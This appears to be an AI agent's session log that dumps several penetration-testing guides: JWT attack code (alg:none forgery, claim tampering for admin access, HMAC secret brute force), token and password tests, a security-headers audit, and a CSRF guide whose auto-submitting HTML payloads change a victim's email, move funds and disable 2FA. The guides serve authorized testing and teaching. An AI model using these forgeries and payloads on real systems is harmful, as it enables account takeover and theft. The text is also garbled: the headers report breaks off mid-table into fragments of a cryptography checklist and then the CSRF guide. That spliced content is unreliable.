forge_none_algorithm(token):\n    \"\"\"Create a token with alg:none to bypass signature verification.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    header['alg'] = 'none'\n    new_header = base64.urlsafe_b64encode(\n        json.dumps(header).encode()).decode().rstrip('=')\n    # Variations of the none algorithm\n    return [\n        f\"{new_header}.{parts[1]}.\",\n        f\"{new_header}.{parts[1]}.{parts[2]}\",\n        f\"{new_header}.{parts[1]}.e30\",\n    ]\n\n# Attack 2: Modify claims without re-signing\ndef forge_payload(token, modifications):\n    \"\"\"Modify payload claims and test if server validates signature.\"\"\"\n    parts = token.split('.')\n    payload = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))\n    payload_data.update(modifications)\n    new_payload = base64.urlsafe_b64encode(\n        json.dumps(payload_data).encode()).decode().rstrip('=')\n    return f\"{parts[0]}.{new_payload}.{parts[2]}\"\n\n# Attack 3: Brute force weak HMAC secrets\nCOMMON_JWT_SECRETS = [\n    \"secret\", \"password\", \"123456\", \"jwt_secret\", \"supersecret\",\n    \"key\", \"test\", \"admin\", \"changeme\", \"default\",\n    \"your-256-bit-secret\", \"my-secret-key\", \"jwt-secret\",\n    \"s3cr3t\", \"secret123\", \"mysecretkey\", \"apisecret\",\n]\n\ndef brute_force_jwt_secret(token):\n    \"\"\"Try common secrets against HMAC-signed JWTs.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    if header.get('alg') not in ('HS256', 'HS384', 'HS512'):\n        print(\"Not an HMAC token, skipping brute force\")\n        return None\n\n    signing_input = f\"{parts[0]}.{parts[1]}\".encode()\n    signature = parts[2]\n\n    hash_func = {\n        'HS256': hashlib.sha256,\n        'HS384': hashlib.sha384,\n        'HS512': hashlib.sha512\n    }[header['alg']]\n\n    for secret in COMMON_JWT_SECRETS:\n        expected_sig = base64.urlsafe_b64encode(\n            hmac.new(secret.encode(), signing_input, hash_func).digest()\n        ).decode().rstrip('=')\n        if expected_sig == signature:\n            print(f\"[CRITICAL] JWT secret found: '{secret}'\")\n            return secret\n\n    print(\"No common secrets matched - consider using hashcat/john for extended brute force\")\n    return None\n\n# Test all attacks\nnone_tokens = forge_none_algorithm(token)\nfor none_token in none_tokens:\n    resp = requests.get(f\"{BASE_URL}/users/me\",\n                       headers={\"Authorization\": f\"Bearer {none_token}\"})\n    if resp.status_code == 200:\n        print(f\"[CRITICAL] alg:none bypass successful\")\n\n# Test privilege escalation via claim modification\nadmin_token = forge_payload(token, {\"role\": \"admin\", \"is_admin\": True})\nresp = requests.get(f\"{BASE_URL}/admin/users\",\n                   headers={\"Authorization\": f\"Bearer {admin_token}\"})\nif resp.status_code == 200:\n    print(\"[CRITICAL] JWT claim modification accepted without signature validation\")\n\nbrute_force_jwt_secret(token)\n```\n\n### Step 5: Token Lifecycle Testing\n\n```python\n# Test 1: Token reuse after logout\nlogout_resp = requests.post(f\"{BASE_URL}/auth/logout\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nprint(f\"Logout: {logout_resp.status_code}\")\n\n# Try to use the token after logout\npost_logout_resp = requests.get(f\"{BASE_URL}/users/me\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nif post_logout_resp.status_code == 200:\n    print(\"[HIGH] Token still valid after logout - no server-side revocation\")\n\n# Test 2: Token reuse after password change\n# (requires changing password and then testing old token)\n\n# Test 3: Refresh token rotation\nrefresh_token = login_data.get(\"refresh_token\")\nif refresh_token:\n    # Use refresh token\n    refresh_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    new_tokens = refresh_resp.json()\n\n    # Try to reuse the same refresh token (should fail if rotation is implemented)\n    reuse_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    if reuse_resp.status_code == 200:\n        print(\"[HIGH] Refresh token reuse allowed - no rotation implemented\")\n\n# Test 4: Token in URL (leakage risk)\nresp = requests.get(f\"{BASE_URL}/users/me?token={token}\")\nif resp.status_code == 200:\n    print(\"[MEDIUM] Token accepted in query parameter - may leak in logs/referrer\")\n```\n\n### Step 6: Password Policy and Credential Testing\n\n```python\n# Test password policy enforcement on registration/change endpoints\nweak_passwords = [\n    \"a\",           # Too short\n    \"password\",    # Common password\n    \"12345678\",    # Numeric only\n    \"abcdefgh\",    # Alpha only, no complexity\n    \"Password1\",   # Meets basic complexity but is common\n    \"\",            # Empty\n    \" \",           # Whitespace\n]\n\nfor pwd in weak_passwords:\n    resp = requests.post(f\"{BASE_URL}/auth/register\",\n        json={\"email\": f\"test_{hash(pwd)%9999}@example.com\",\n              \"password\": pwd, \"name\": \"Test User\"})\n    if resp.status_code in (200, 201):\n        print(f\"[WEAK POLICY] Password accepted: '{pwd}'\")\n\n# Test account enumeration via login response differences\nvalid_email = \"testuser@example.com\"\ninvalid_email = \"nonexistent_user_xyz@example.com\"\n\nresp_valid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": valid_email, \"password\": \"wrongpassword\"})\nresp_invalid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": invalid_email, \"password\": \"wrongpassword\"})\n\nif resp_valid.text != resp_invalid.text or resp_valid.status_code != resp_invalid.status_code:\n    print(f\"[MEDIUM] Account enumeration possible:\")\n    print(f\"  Valid user: {resp_valid.status_code} - {resp_valid.text[:100]}\")\n    print(f\"  Invalid user: {resp_invalid.status_code} - {resp_invalid.text[:100]}\")\n```\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| **Broken Authentication** | OWASP API2:2023 - weaknesses in authentication mechanisms that allow attackers to assume identities of legitimate users |\n| **JWT (JSON Web Token)** | Self-contained token format with header.payload.signature structure, used for stateless API authentication |\n| **Token Revocation** | Server-side mechanism to invalidate tokens before their expiration, critical for logout and password change |\n| **Credential Stuffing** | Automated attack using leaked username/password pairs against authentication endpoints |\n| **Account Enumeration** | Determining valid usernames through different error messages or response times for valid vs invalid accounts |\n| **Refresh Token Rotation** | Security practice where each use of a refresh token generates a new one, preventing token reuse attacks |\n\n## Tools & Systems\n\n- **Burp Suite JWT Editor**: Extension for decoding, editing, and re-signing JWT tokens with various attack modes\n- **jwt_tool**: Python tool for JWT testing with 12+ attack modes including alg:none, key confusion, and JWKS spoofing\n- **hashcat**: GPU-accelerated password cracker supporting JWT HMAC secret brute-forcing (mode 16500)\n- **Hydra**: Network login brute-forcer supporting HTTP form-based and API authentication testing\n- **Nuclei**: Template-based scanner with authentication bypass detection templates\n\n## Common Scenarios\n\n### Scenario: SaaS Platform API Authentication Assessment\n\n**Context**: A SaaS platform uses JWT tokens for API authentication. The JWT is issued upon login and used for all subsequent API calls. A refresh token mechanism is also implemented.\n\n**Approach**:\n1. Authenticate and capture the JWT: algorithm is HS256, expiration is 7 days, payload contains user role\n2. Test alg:none bypass: server rejects the token (secure)\n3. Brute force the HMAC secret: discover the secret is \"company-jwt-secret-2023\" (found using hashcat with custom wordlist)\n4. Forge a JWT with admin role using the discovered secret: gain admin access to all endpoints\n5. Test token revocation: tokens remain valid after logout and password change (no blacklist)\n6. Test refresh token: refresh token has no expiration and can be reused indefinitely\n7. Find that the password reset endpoint returns different messages for valid vs invalid emails\n8. Discover that the `/health` and `/metrics` endpoints are accessible without authentication\n\n**Pitfalls**:\n- Only testing the login endpoint and missing authentication weaknesses in password reset, MFA, and token refresh flows\n- Not checking if the JWT secret is the same across all environments (dev, staging, production)\n- Ignoring the token lifetime: a 7-day JWT with no revocation means a stolen token is valid for a week\n- Not testing for token leakage in server logs, URL parameters, or error messages\n\n## Output Format\n\n```\n## Finding: JWT HMAC Secret Brute-Forceable and Token Not Revocable\n\n**ID**: API-AUTH-001\n**Severity**: Critical (CVSS 9.1)\n**OWASP API**: API2:2023 - Broken Authentication\n**Affected Components**:\n  - POST /api/v1/auth/login (token issuance)\n  - All authenticated endpoints (token validation)\n  - POST /api/v1/auth/logout (ineffective)\n\n**Description**:\nThe API uses HS256-signed JWT tokens with a brute-forceable secret\n(\"company-jwt-secret-2023\"). An attacker who discovers this secret can\nforge tokens for any user with any role, including admin. Additionally,\ntokens are not revocable - logout does not invalidate the token server-side,\nand the 7-day expiration means stolen tokens remain valid for extended periods.\n\n**Attack Chain**:\n1. Capture any valid JWT from authenticated session\n2. Brute force the HMAC secret using hashcat: hashcat -a 0 -m 16500 jwt.txt wordlist.txt\n3. Secret recovered in 3 minutes: \"company-jwt-secret-2023\"\n4. Forge admin JWT: modify \"role\" claim to \"admin\", re-sign with discovered secret\n5. Access admin endpoints: GET /api/v1/admin/users returns all 50,000 user accounts\n\n**Remediation**:\n1. Replace HS256 with RS256 using a 2048-bit RSA key pair\n2. Use a cryptographically random secret of at least 256 bits if HMAC must be used\n3. Implement token blacklisting using Redis for logout and password change events\n4. Reduce token TTL to 15 minutes with refresh token rotation\n5. Add `iss` and `aud` claims validation to prevent token misuse across services\n```\n"}]}},{"type":"assistant","uuid":"404d5604-9cea-45da-a138-b7d653cc2d51","session_id":"2b41e2df-dc0b-4f8a-8b29-967490f5bc42","parent_tool_use_id":null,"message":{"id":"404d5604-9cea-45da-a138-b7d653cc2d51","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"text","text":"Good. performing-security-headers-audit\ndescription: Auditing HTTP security headers including CSP, HSTS, X-Frame-Options,\n  and cookie attributes to identify missing or misconfigured browser-level protections.\ndomain: cybersecurity\nsubdomain: web-application-security\ntags:\n- penetration-testing\n- security-headers\n- csp\n- hsts\n- owasp\n- web-security\n- hardening\nversion: '1.0'\nauthor: mahipal\nlicense: Apache-2.0\nnist_csf:\n- PR.PS-01\n- ID.RA-01\n- PR.DS-10\n- DE.CM-01\nmitre_attack:\n- T1190\n- T1059.007\n- T1505.003\n- T1083\n---\n\n# Performing Security Headers Audit\n\n## When to Use\n\n- During authorized web application security assessments as a standard configuration review\n- When evaluating browser-level protections against XSS, clickjacking, and data leakage\n- For compliance assessments requiring security header implementation (PCI DSS, SOC 2)\n- When performing initial reconnaissance to identify easy-win security improvements\n- During CI/CD pipeline security gate checks for new deployments\n\n## Prerequisites\n\n- **Authorization**: Written scope for the target application (header review is low-risk)\n- **curl**: For fetching response headers from target endpoints\n- **SecurityHeaders.com**: Online scanner for quick header assessment\n- **Mozilla Observatory**: Mozilla's web security testing tool\n- **Burp Suite**: For comprehensive header analysis across multiple pages\n- **Browser DevTools**: For examining headers and CSP violations in real-time\n\n## Workflow\n\n### Step 1: Collect Security Headers from Target\n\nRetrieve and catalog all security-related response headers.\n\n```bash\n# Fetch all response headers\ncurl -s -I \"https://target.example.com/\" | grep -iE \\\n  \"(strict-transport|content-security|x-frame|x-content-type|x-xss|referrer-policy|permissions-policy|feature-policy|x-permitted|cross-origin|set-cookie|server|x-powered-by|cache-control)\"\n\n# Check headers across multiple pages\nPAGES=(\"/\" \"/login\" \"/api/health\" \"/admin\" \"/account/settings\" \"/static/app.js\")\n\nfor page in \"${PAGES[@]}\"; do\n  echo \"=== $page ===\"\n  curl -s -I \"https://target.example.com$page\" 2>/dev/null | grep -iE \\\n    \"(strict-transport|content-security|x-frame|x-content-type|x-xss|referrer-policy|permissions-policy|set-cookie|server|x-powered)\"\n  echo\ndone\n\n# Check both HTTP and HTTPS responses\necho \"=== HTTP Response ===\"\ncurl -s -I \"http://target.example.com/\" | head -20\necho \"=== HTTPS Response ===\"\ncurl -s -I \"https://target.example.com/\" | head -20\n```\n\n### Step 2: Assess Transport Security (HSTS)\n\nEvaluate HTTP Strict Transport Security configuration.\n\n```bash\n# Check HSTS header\ncurl -s -I \"https://target.example.com/\" | grep -i \"strict-transport-security\"\n\n# Expected: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\n\n# Verify HSTS attributes:\n# max-age: Should be >= 31536000 (1 year) for preload eligibility\n# includeSubDomains: Protects all subdomains\n# preload: Eligible for browser HSTS preload list\n\n# Check if HTTP redirects to HTTPS\ncurl -s -I \"http://target.example.com/\" | head -5\n# Should be 301/302 redirect to https://\n\n# Check if HSTS is on the preload list\n# Visit: https://hstspreload.org/?domain=target.example.com\n\n# Test for HTTPS-only cookies\ncurl -s -I \"https://target.example.com/login\" | grep -i \"set-cookie\"\n# All session cookies should have Secure flag\n\n# Check for mixed content\ncurl -s \"https://target.example.com/\" | grep -oP \"http://[^\\\"']+\" | head -20\n# HTTP resources loaded on HTTPS pages create mixed content vulnerabilities\n```\n\n### Step 3: Audit Content Security Policy (CSP)\n\nAnalyze CSP headers for effectiveness and potential bypasses.\n\n```bash\n# Extract CSP header\nCSP=$(curl -s -I \"https://target.example.com/\" | grep -i \"content-security-policy\" | cut -d: -f2-)\necho \"$CSP\"\n\n# Check for dangerous directives:\n# 'unsafe-inline' in script-src: Allows inline scripts (XSS risk)\n# 'unsafe-eval' in script-src: Allows eval() (XSS risk)\n# * in any directive: Allows loading from any origin\n# data: in script-src: Allows data: URI scripts\n# Missing default-src: No fallback policy\n\necho \"$CSP\" | tr ';' '\\n' | while read directive; do\n  echo \"  $directive\"\n  if echo \"$directive\" | grep -q \"unsafe-inline\"; then\n    echo \"    WARNING: unsafe-inline allows inline script execution\"\n  fi\n  if echo \"$directive\" | grep -q \"unsafe-eval\"; then\n    echo \"    WARNING: unsafe-eval allows eval() calls\"\n  fi\n  if echo \"$directive\" | grep -q \" \\* \"; then\n    echo \"    WARNING: wildcard allows loading from any origin\"\n  fi\ndone\n\n# Check for CSP report-only (not enforcing)\ncurl -s -I \"https://target.example.com/\" | grep -i \"content-security-policy-report-only\"\n# Report-only does NOT block violations, only logs them\n\n# Test CSP with Google's evaluator\n# https://csp-evaluator.withgoogle.com/\n# Paste the CSP header for automated analysis\n\n# Check for CSP bypass via whitelisted domains\n# If CDN domains are whitelisted, check for JSONP endpoints or angular libraries\n```\n\n### Step 4: Check Frame Protection and Click Defense Headers\n\nVerify anti-clickjacking and iframe embedding controls.\n\n```bash\n# X-Frame-Options\ncurl -s -I \"https://target.example.com/\" | grep -i \"x-frame-options\"\n# Expected: DENY or SAMEORIGIN\n# ALLOW-FROM is deprecated and not supported in modern browsers\n\n# CSP frame-ancestors (supersedes X-Frame-Options)\ncurl -s -I \"https://target.example.com/\" | grep -i \"content-security-policy\" | grep -o \"frame-ancestors[^;]*\"\n# Expected: frame-ancestors 'none' or frame-ancestors 'self'\n\n# X-Content-Type-Options\ncurl -s -I \"https://target.example.com/\" | grep -i \"x-content-type-options\"\n# Expected: nosniff (prevents MIME type sniffing)\n\n# X-XSS-Protection (legacy, but still useful for older browsers)\ncurl -s -I \"https://target.example.com/\" | grep -i \"x-xss-protection\"\n# Expected: 1; mode=block (or 0 if CSP is comprehensive)\n# Note: Modern recommendation is 0 (disable) when CSP is present\n\n# Referrer-Policy\ncurl -s -I \"https://target.example.com/\" | grep -i \"referrer-policy\"\n# Expected: strict-origin-when-cross-origin or no-referrer\n# Prevents sensitive URL data from leaking via Referer header\n```\n\n### Step 5: Audit Cookie Security Attributes\n\nExamine session and authentication cookies for security flags.\n\n```bash\n# Fetch all Set-Cookie headers\ncurl -s -I -L \"https://target.example.com/login\" | grep -i \"set-cookie\"\n\n# Check each cookie for required attributes:\n# Secure: Only sent over HTTPS\n# HttpOnly: Not accessible via JavaScript (prevents XSS cookie theft)\n# SameSite: Controls cross-site cookie sending (Strict, Lax, None)\n# Path: Restricts cookie scope\n# Domain: Controls which domains receive the cookie\n# Max-Age/Expires: Cookie lifetime\n\n# Automated cookie check\ncurl -s -I \"https://target.example.com/login\" | grep -i \"set-cookie\" | while read line; do\n  echo \"Cookie: $(echo \"$line\" | grep -oP '[^:]+=[^;]+')\"\n  missing=\"\"\n  echo \"$line\" | grep -qi \"secure\" || missing=\"$missing Secure\"\n  echo \"$line\" | grep -qi \"httponly\" || missing=\"$missing HttpOnly\"\n  echo \"$line\" | grep -qi \"samesite\" || missing=\"$missing SameSite\"\n  if [ -n \"$missing\" ]; then\n    echo \"  MISSING:$missing\"\n  else\n    echo \"  All flags present\"\n  fi\ndone\n\n# Check for __Host- and __Secure- cookie prefixes\n# __Host- cookies must have Secure, Path=/, no Domain\n# __Secure- cookies must have Secure flag\n```\n\n### Step 6: Check Permissions Policy and Information Disclosure\n\nReview browser feature controls and information leakage headers.\n\n```bash\n# Permissions-Policy (formerly Feature-Policy)\ncurl -s -I \"https://target.example.com/\" | grep -i \"permissions-policy\"\n# Controls browser features: camera, microphone, geolocation, etc.\n# Expected: Restrict unused features\n# Example: permissions-policy: camera=(), microphone=(), geolocation=()\n\n# Cross-Origin headers\ncurl -s -I \"https://target.example.com/\" | grep -iE \"(cross-origin-embedder|cross-origin-opener|cross-origin-resource)\"\n# COEP: Cross-Origin-Embedder-Policy: require-corp\n# COOP: Cross-Origin-Opener-Policy: same-origin\n# CORP: Cross-Origin-Resource-Policy: same-origin\n\n# Information disclosure headers to flag\ncurl -s -I \"https://target.example.com/\" | grep -iE \"(server|x-powered-by|x-aspnet|x-generator)\"\n# Server: Apache/2.4.52 (should be removed or generic)\n# X-Powered-By: PHP/8.1.2 (should be removed)\n# These headers reveal technology stack to attackers\n\n# Cache-Control for sensitive pages\ncurl -s -I \"https://target.example.com/account/settings\" | grep -i \"cache-control\"\n# Sensitive pages should have: Cache-Control: no-store, no-cache, must-revalidate\n# Prevents browser caching of sensitive data\n\n# Generate comprehensive report using online tools\necho \"Scan with SecurityHeaders.com: https://securityheaders.com/?q=target.example.com\"\necho \"Scan with Mozilla Observatory: https://observatory.mozilla.org/analyze/target.example.com\"\n```\n\n## Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| **HSTS** | Forces browsers to only use HTTPS for the domain, preventing protocol downgrade attacks |\n| **CSP** | Restricts which resources (scripts, styles, images) can load on the page |\n| **X-Frame-Options** | Controls whether the page can be embedded in iframes (clickjacking defense) |\n| **X-Content-Type-Options** | Prevents MIME type sniffing; forces browser to respect declared Content-Type |\n| **Referrer-Policy** | Controls how much referrer information is sent with cross-origin requests |\n| **Permissions-Policy** | Restricts browser features (camera, microphone, geolocation) available to the page |\n| **SameSite Cookie** | Controls when cookies are sent in cross-site contexts (Strict, Lax, None) |\n| **HSTS Preloading** | Hardcoding HSTS policy in browser source code for first-visit protection |\n\n## Tools & Systems\n\n| Tool | Purpose |\n|------|---------|\n| **SecurityHeaders.com** | Online scanner providing letter-grade security header assessment |\n| **Mozilla Observatory** | Comprehensive web security scanner with scoring and recommendations |\n| **CSP Evaluator (Google)** | Analyzes Content Security Policy for weaknesses and bypasses |\n| **Burp Suite Professional** | Inspecting response headers across all application pages |\n| **securityheaders (CLI)** | Command-line security header scanner |\n| **Hardenize** | TLS and security header monitoring service |\n\n## Common Scenarios\n\n### Scenario 1: Complete Header Absence\nA legacy application returns no security headers at all. No HSTS, CSP, X-Frame-Options, or cookie security flags. Every page is vulnerable to clickjacking, XSS has no browser-level mitigation, and cookies are sent over HTTP.\n\n### Scenario 2: Weak CSP with unsafe-inline\nThe CSP header includes `script-src 'self' 'unsafe-inline'`. While it restricts external script loading, the `unsafe-inline` directive allows any inline script to execute, rendering the CSP ineffective against XSS.\n\n### Scenario 3: Session Cookie Without Secure Flag\nThe session cookie is set without the `Secure` flag. On mixed HTTP/HTTPS sites, the session token can be intercepted by a network attacker via a plain HTTP request.\n\n### Scenario 4: Missing HSTS Enabling SSL Stripping\nNo HSTS header is present. An attacker on the network can perform an SSL stripping attack, downgrading the victim's HTTPS connection to HTTP and intercepting all traffic.\n\n## Output Format\n\n```\n## Security Headers Audit Report\n\n**Target**: target.example.com\n**Grade**: D (SecurityHeaders.com)\n**Assessment Date**: 2024-01-15\n\n### Headers Assessment\n| Header | Status | Current Value | Recommended |\n|--------|--------|---------------|-------------|\n| Strict-Transport-Security | MISSING | - | max-age=31536000; RC4)\n- Identify insecure cipher modes (ECB) and padding schemes\n- Find hardcoded keys, passwords, and secrets in source code\n- Verify TLS/SSL configuration strength\n- Check key derivation function Examples | Risk Level |\n|----------|----------|------------|\n| Weak Hashing | MD5, SHA-1 for integrity/signatures | High |\n| Insecure Encryption | DES, 3DES, RC4, Blowfish | High |\n| Bad Cipher Mode | ECB mode for any block cipher | High |\n| Insufficient Key Size | RSA < 2048, AES-128 for long-term | Medium |\n| Hardcoded Secrets | Keys/passwords in source code | Critical |\n| Weak KDF | Low iteration PBKDF2, plain MD5 | High |\n| Poor Entropy | time-based seeds, predictable IVs | High |\n| Deprecated Protocols | SSLv3, TLS 1.0, TLS 1.1 | High |\n\n## Security Considerations\n\n- usage for security purposes is flagged\n- [ ] ECB mode usage is flagged\n- [ ] Hardcoded keys/passwords are detected\n- [ ] Weak KDF parameters are identified\n- [ ] Report includes severity, Performing CSRF Attack Simulation\n\n## When to Use\n\n- During authorized web application penetration tests to identify state-changing actions vulnerable to CSRF\n- When testing the effectiveness of anti-CSRF token implementations\n- For validating SameSite cookie attribute enforcement across different browsers\n- When assessing applications that perform sensitive operations (password change, fund transfer, settings modification)\n- During security audits of custom authentication and session management mechanisms\n\n## Prerequisites\n\n- **Authorization**: Written penetration testing agreement for the target\n- **Burp Suite Professional**: With CSRF PoC generator functionality\n- **Web server**: Local HTTP server for hosting CSRF PoC pages (Python `http.server`)\n- **Two browsers**: One authenticated as victim, one as attacker\n- **Target application**: Authenticated session with valid test credentials\n- **HTML/JavaScript knowledge**: For crafting custom CSRF payloads\n\n\n> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.\n\n## Workflow\n\n### Step 1: Identify State-Changing Requests\n\nBrowse the application and identify all POST/PUT/DELETE requests that modify server-side state.\n\n```\n# In Burp Suite, review Proxy > HTTP History\n# Filter for POST/PUT/DELETE methods\n# Focus on actions like:\n# - Password/email change\n# - Fund/money transfers\n# - Account settings modifications\n# - Adding/removing users or permissions\n# - Creating/deleting resources\n# - Toggling security features (2FA disable)\n\n# Example state-changing request captured in Burp:\nPOST /api/account/change-email HTTP/1.1\nHost: target.example.com\nCookie: session=abc123def456\nContent-Type: application/x-www-form-urlencoded\n\nemail=newemail@example.com\n\n# Check for anti-CSRF protections:\n# - CSRF tokens in form fields or headers\n# - Custom headers (X-CSRF-Token, X-Requested-With)\n# - SameSite cookie attribute\n# - Referer/Origin header validation\n```\n\n### Step 2: Analyze Anti-CSRF Token Implementation\n\nTest the strength and enforcement of any CSRF protections present.\n\n```bash\n# Check if CSRF token is present\ncurl -s -b \"session=abc123\" \\\n  \"https://target.example.com/account/settings\" | \\\n  grep -i \"csrf\\|token\\|_token\"\n\n# Test 1: Remove the CSRF token entirely\ncurl -s -X POST \\\n  -b \"session=abc123\" \\\n  -d \"email=test@evil.com\" \\\n  \"https://target.example.com/api/account/change-email\" \\\n  -w \"%{http_code}\"\n\n# Test 2: Send empty CSRF token\ncurl -s -X POST \\\n  -b \"session=abc123\" \\\n  -d \"email=test@evil.com&csrf_token=\" \\\n  \"https://target.example.com/api/account/change-email\" \\\n  -w \"%{http_code}\"\n\n# Test 3: Use a random/invalid CSRF token\ncurl -s -X POST \\\n  -b \"session=abc123\" \\\n  -d \"email=test@evil.com&csrf_token=AAAAAAAAAA\" \\\n  \"https://target.example.com/api/account/change-email\" \\\n  -w \"%{http_code}\"\n\n# Test 4: Reuse an expired/old CSRF token\ncurl -s -X POST \\\n  -b \"session=abc123\" \\\n  -d \"email=test@evil.com&csrf_token=previously_captured_token\" \\\n  \"https://target.example.com/api/account/change-email\" \\\n  -w \"%{http_code}\"\n\n# Test 5: Use User B's CSRF token with User A's session\ncurl -s -X POST \\\n  -b \"session=user_a_session\" \\\n  -d \"email=test@evil.com&csrf_token=user_b_csrf_token\" \\\n  \"https://target.example.com/api/account/change-email\" \\\n  -w \"%{http_code}\"\n```\n\n### Step 3: Check SameSite Cookie and Header Protections\n\nVerify browser-level and header-based CSRF defenses.\n\n```bash\n# Check SameSite attribute on session cookies\ncurl -s -I \"https://target.example.com/login\" | grep -i \"set-cookie\"\n# Look for: SameSite=Strict, SameSite=Lax, or SameSite=None\n\n# SameSite=Lax allows CSRF on top-level GET navigations\n# SameSite=None; Secure allows cross-site requests\n# No SameSite attribute: browser defaults to Lax (modern browsers)\n\n# Check for Origin/Referer header validation\n# Send request with no Referer\ncurl -s -X POST \\\n  -b \"session=abc123\" \\\n  -H \"Referer: \" \\\n  -d \"email=test@evil.com&csrf_token=valid_token\" \\\n  \"https://target.example.com/api/account/change-email\" \\\n  -w \"%{http_code}\"\n\n# Send request with evil Referer\ncurl -s -X POST \\\n  -b \"session=abc123\" \\\n  -H \"Referer: https://evil.example.com/attack\" \\\n  -d \"email=test@evil.com&csrf_token=valid_token\" \\\n  \"https://target.example.com/api/account/change-email\" \\\n  -w \"%{http_code}\"\n\n# Send request with spoofed Origin\ncurl -s -X POST \\\n  -b \"session=abc123\" \\\n  -H \"Origin: https://evil.example.com\" \\\n  -d \"email=test@evil.com\" \\\n  \"https://target.example.com/api/account/change-email\" \\\n  -w \"%{http_code}\"\n```\n\n### Step 4: Generate CSRF Proof-of-Concept with Burp Suite\n\nUse Burp's built-in CSRF PoC generator for rapid testing.\n\n```\n# In Burp Suite:\n# 1. Right-click the target request in Proxy > HTTP History\n# 2. Select \"Engagement tools\" > \"Generate CSRF PoC\"\n# 3. Click \"Test in browser\" to validate the PoC\n\n# Burp generates HTML like:\n```\n\n```html\n<!-- Auto-submitting CSRF PoC for form-encoded POST -->\n<html>\n  <body>\n    <h1>Loading...</h1>\n    <form action=\"https://target.example.com/api/account/change-email\"\n          method=\"POST\" id=\"csrf-form\">\n      <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n    </form>\n    <script>\n      document.getElementById('csrf-form').submit();\n    </script>\n  </body>\n</html>\n```\n\n### Step 5: Craft Advanced CSRF Payloads\n\nFor JSON APIs and other non-standard content types, use advanced techniques.\n\n```html\n<!-- CSRF for JSON API using form with enctype -->\n<html>\n  <body>\n    <form action=\"https://target.example.com/api/account/change-email\"\n          method=\"POST\"\n          enctype=\"text/plain\"\n          id=\"csrf-form\">\n      <input type=\"hidden\"\n             name='{\"email\":\"attacker@evil.com\",\"ignore\":\"'\n             value='\"}' />\n    </form>\n    <script>\n      document.getElementById('csrf-form').submit();\n    </script>\n  </body>\n</html>\n\n<!-- CSRF via XMLHttpRequest (requires permissive CORS) -->\n<script>\nvar xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"https://target.example.com/api/account/change-email\", true);\nxhr.setRequestHeader(\"Content-Type\", \"application/json\");\nxhr.withCredentials = true;\nxhr.send(JSON.stringify({\"email\": \"attacker@evil.com\"}));\n</script>\n\n<!-- CSRF via fetch API -->\n<script>\nfetch(\"https://target.example.com/api/account/change-email\", {\n  method: \"POST\",\n  credentials: \"include\",\n  headers: {\"Content-Type\": \"application/x-www-form-urlencoded\"},\n  body: \"email=attacker@evil.com\"\n});\n</script>\n\n<!-- CSRF via image tag (GET-based state change) -->\n<img src=\"https://target.example.com/api/account/delete?confirm=true\"\n     style=\"display:none\" />\n\n<!-- Multi-step CSRF with iframe -->\n<iframe style=\"display:none\" name=\"csrf-frame\"></iframe>\n<form action=\"https://target.example.com/api/transfer\"\n      method=\"POST\" target=\"csrf-frame\" id=\"csrf-form\">\n  <input type=\"hidden\" name=\"to_account\" value=\"attacker-account\" />\n  <input type=\"hidden\" name=\"amount\" value=\"1000\" />\n</form>\n<script>document.getElementById('csrf-form').submit();</script>\n```\n\n### Step 6: Test and Validate the CSRF Attack\n\nHost the PoC and confirm successful exploitation.\n\n```bash\n# Start a local web server to host the CSRF PoC\ncd /tmp/csrf-poc\npython3 -m http.server 8888\n\n# PoC file structure:\n# /tmp/csrf-poc/\n#   index.html          <- CSRF PoC page\n#   change-email.html   <- Email change CSRF\n#   transfer.html       <- Fund transfer CSRF\n\n# Testing steps:\n# 1. Log in to target as victim user in Browser A\n# 2. Open http://localhost:8888/change-email.html in Browser A\n# 3. Check if the email was changed without victim's consent\n# 4. Verify the state change in the application\n\n# For SameSite=Lax bypass via top-level navigation:\n# Use GET-based CSRF with window.open or anchor tag\n```\n\n```html\n<!-- SameSite=Lax bypass using top-level navigation -->\n<html>\n  <body>\n    <a href=\"https://target.example.com/api/settings?action=disable_2fa\"\n       id=\"csrf-link\">Click here for a prize!</a>\n    <script>\n      // Automatic click via social engineering context\n      // SameSite=Lax allows cookies on top-level GET navigations\n    </script>\n  </body>\n</html>\n```\n\n## Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| **CSRF** | Attack that tricks an authenticated user's browser into making unintended requests to a vulnerable site |\n| **Anti-CSRF Token** | A unique, unpredictable value tied to the user's session that must be included in state-changing requests |\n| **SameSite Cookie** | Browser attribute (Strict, Lax, None) controlling when cookies are sent in cross-site requests |\n| **Origin Header** | HTTP header indicating the origin of the request, used for CSRF validation |\n| **Referer Header** | HTTP header containing the URL of the referring page, sometimes used for CSRF checks |\n| **Double Submit Cookie** | CSRF defense that compares a cookie value with a request parameter value |\n| **Synchronizer Token Pattern** | Server generates and validates a unique token per session or per request |\n\n## Tools & Systems\n\n| Tool | Purpose |\n|------|---------|\n| **Burp Suite Professional** | CSRF PoC generator and request analysis |\n| **OWASP ZAP** | Anti-CSRF token detection and CSRF testing |\n| **XSRFProbe** | Automated CSRF vulnerability scanner (`pip install xsrfprobe`) |\n| **Python http.server** | Local web server for hosting CSRF PoC pages |\n| **Browser DevTools** | Inspecting cookies, SameSite attributes, and network requests |\n| **CSRFTester (OWASP)** | Legacy tool for crafting and testing CSRF attacks |\n\n## Common Scenarios\n\n### Scenario 1: Email Change Without CSRF Token\nThe email change form does not include a CSRF token. An attacker hosts a page that 